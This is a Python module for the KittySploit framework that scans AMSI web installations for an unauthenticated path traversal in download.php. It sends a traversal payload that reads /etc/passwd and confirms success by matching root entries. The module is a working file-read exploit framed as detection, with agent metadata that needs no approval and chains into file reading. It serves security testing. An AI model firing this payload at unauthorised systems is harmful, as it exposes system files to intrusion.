#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AMSI download.php path traversal."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AMSI - download.php Path Traversal Detection',
        'description': (
            'Detects AMSI download.php?file= path traversal to /etc/passwd '
            '(requires amsi_web/amsi_moodle markers).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'amsi', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.7,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/36014',
        ],
    }

    def run(self):
        for base in ('', '/amsi', '/AMSI'):
            path = f'{base}/download.php?file=../../../../../../etc/passwd'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r:
                continue
            body = r.text or ''
            if re.search(r'root:.*:0:0:', body) and ('amsi_web' in body or 'amsi_moodle' in body):
                self.set_info(
                    severity='high',
                    reason='AMSI download.php LFI',
                    path=f'{base}/download.php',
                )
                return True
        return False
